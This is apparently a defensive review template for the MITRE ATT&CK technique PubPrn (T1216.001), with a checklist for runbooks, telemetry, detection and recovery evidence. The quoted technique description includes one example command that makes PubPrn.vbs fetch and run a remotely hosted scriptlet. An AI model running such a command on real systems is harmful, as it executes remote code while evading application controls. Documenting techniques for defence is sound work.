# PubPrn Technique Operationalization Review

## Reference

- Technique: **T1216.001 — PubPrn**

Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the Windows Command Shell via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>. Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites. To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script. In later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).

## Operationalization review

1. Record the operational scope: which services, environments, and data the technique could affect.
2. Record the runbook that would be executed, and its owner.
3. Record the telemetry the runbook depends on, and whether it is retained long enough to investigate.
4. Record the detection that would surface the technique before or after it has an effect.
5. Record the recovery path, and the evidence that recovery has been rehearsed.
6. Record the residual operational risk where the runbook depends on a manual step.

## Review evidence

- the runbook and its owner;
- the telemetry retention and coverage record;
- the detection mapping;
- the exercise or rehearsal record.

## Limitations

An operationalization review describes the runbook and the evidence around it. It does not claim the technique has been prevented or detected in a live environment.

## Source

- MITRE ATT&CK: https://attack.mitre.org/
- T1216.001: https://attack.mitre.org/techniques/T1216/001
- Reviewed: 2026-10-27
